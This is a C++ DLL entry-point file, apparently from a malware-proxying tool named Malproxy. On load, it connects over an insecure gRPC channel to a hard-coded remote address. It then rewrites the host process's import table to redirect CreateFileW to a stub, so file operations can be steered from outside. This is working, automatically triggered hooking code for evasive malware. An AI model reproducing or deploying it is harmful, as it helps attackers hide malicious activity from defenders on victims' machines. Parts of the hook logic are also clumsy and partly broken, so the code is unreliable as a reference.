// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <memory>
#include <RpcLib\MalproxySession.h>
#include <Framework\Utils.h>
#include <MalproxyClient\MalproxyClientRunner.h>
#include "Dbghelp.h"
 





void InitGRPC() {
    std::shared_ptr<MalproxySession> client = std::make_shared<MalproxySession>();
    std::string url = StringUtils::FormatString("172.168.1.120:8888");
    client->Connect(url, grpc::InsecureChannelCredentials());
    MalproxyClientRunner::Init(client);
}

void InstallHook() {
	ULONG ulSize = 0;
	PROC pHookFunction = NULL;
	PROC pHookedFunction = NULL;

	PSTR pszModName = NULL;

	HMODULE hModule = GetModuleHandle(0);
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = NULL;

	pHookFunction = GetProcAddress(GetModuleHandle(L"MalproxyClientDLL.dll"), "CreateFileW_stub");
	pHookedFunction = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "CreateFileW");

	pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(
		hModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &ulSize);

	if (NULL != pImportDesc)
	{
		for (; pImportDesc->Name; pImportDesc++)
		{
			// get the module name
			pszModName = (PSTR)((PBYTE)hModule + pImportDesc->Name);

			if (NULL != pszModName)
			{
				// check if the module is kernel32.dll
				if (lstrcmpiA(pszModName, "Kernel32.dll") == 0)
				{
					// get the module
					PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + pImportDesc->FirstThunk);

					for (; pThunk->u1.Function; pThunk++)
					{
						PROC* ppfn = (PROC*)&pThunk->u1.Function;
						if (*ppfn == pHookedFunction)
						{
							WriteProcessMemory(GetCurrentProcess(), ppfn, &pHookedFunction, sizeof(pHookFunction), NULL);
							DWORD dwTest = GetLastError();

							if (WriteProcessMemory(GetCurrentProcess(), ppfn, &pHookedFunction, sizeof(pHookFunction), NULL))
							{
								DWORD dwOldProtect = 0;
								if (VirtualProtect(ppfn, sizeof(pHookFunction), PAGE_WRITECOPY, &dwOldProtect))
								{
									// perform the write ....
									WriteProcessMemory(GetCurrentProcess(), ppfn, &pHookFunction, sizeof(pHookFunction), NULL);
									VirtualProtect(ppfn, sizeof(pHookFunction), dwOldProtect, &dwOldProtect);
								}
							}// Can write to the process
						} // Function that we are looking for
					}
				} // Compare module name
			} // Valid module name
		}
	}
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        InitGRPC();
        InstallHook();
    }
    return TRUE;
    }
}

